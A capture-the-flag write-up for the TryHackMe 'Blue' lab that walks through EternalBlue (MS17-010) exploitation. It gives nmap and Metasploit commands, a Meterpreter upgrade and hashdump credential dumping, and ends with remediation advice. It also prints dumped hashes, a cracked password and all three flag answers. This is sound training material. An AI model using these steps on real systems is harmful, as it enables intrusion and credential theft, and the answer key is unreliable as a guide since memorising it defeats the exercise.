# CTF Writeup: Blue (TryHackMe)


**Date:** 2026-02-23  

---

## 1. Introduction

The *Blue* machine is a classic TryHackMe challenge focused on exploiting the **EternalBlue (MS17-010)** vulnerability.

This vulnerability affects the SMB protocol on older Windows systems and allows **unauthenticated remote code execution (RCE)**, making it extremely critical.

---

## 2. Reconnaissance

The first step is identifying open ports and services running on the target.

### Port Scanning

A standard `nmap` scan was performed to detect service versions and run default scripts:

```bash
nmap 10.66.182.179 -sV -sC -T3 -oN nmap/nmap.log
```

**Observation:**

The scan revealed **three open ports under 1000**, typically:

- 135 (RPC)  
- 139 (NetBIOS)  
- 445 (SMB)  

---

### Vulnerability Assessment

Since SMB (port 445) was open, a targeted scan was performed to check for known SMB vulnerabilities:

```bash
nmap 10.66.182.179 --script=smb-vuln* -T2 -p445
```

The results confirmed that the target is vulnerable to:

```
MS17-010 (EternalBlue)
```

---

## 3. Gaining Access

The vulnerability was exploited using the Metasploit Framework.

### Launch Metasploit

```bash
msfconsole -q
```

### Search and Select Exploit

```bash
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
```

### Configure and Run

```bash
set RHOSTS 10.66.182.179
exploit
```

This resulted in a successful shell on the target system.

---

## 4. Privilege Escalation & Post-Exploitation

After gaining access, the shell was upgraded to a **Meterpreter session** for better control and post-exploitation capabilities.

### Upgrade to Meterpreter

Module used:

```
post/multi/manage/shell_to_meterpreter
```

Required option:

```
SESSION
```

---

### Credential Dumping

With SYSTEM-level access, local password hashes were extracted:

```bash
meterpreter > hashdump
```

**Dumped hashes:**

```
Administrator: 31d6cfe0d16ae931b73c59d7e0c089c0
Jon:           ffb43f0de35be4d9917ac0cc8ad57f8d
```

After cracking Jon’s hash, the plaintext password was recovered:

```
Jon: alqfan22
```

---

## 5. Finding the Flags

Using Meterpreter search functionality, the flags were located:

| Flag | Location | Content |
|------|--------|--------|
| Flag 1 | `C:\flag1.txt` | `flag{access_the_machine}` |
| Flag 2 | `C:\Windows\System32\config\flag2.txt` | `flag{sam_database_elevated_access}` |
| Flag 3 | `C:\Users\Jon\Documents\flag3.txt` | `flag{admin_documents_can_be_valuable}` |

---

## 6. Conclusion

This machine highlights the severe risk of unpatched SMB services.

By exploiting **MS17-010**, full **NT AUTHORITY\SYSTEM** access was obtained, allowing:

- Credential dumping  
- Lateral movement potential  
- Access to sensitive data  

---

## Remediation

To prevent this type of attack:

- Apply the latest Windows security patches  
- Disable SMBv1 if not required  
- Restrict SMB access via firewall rules  
- Monitor for suspicious SMB activity  

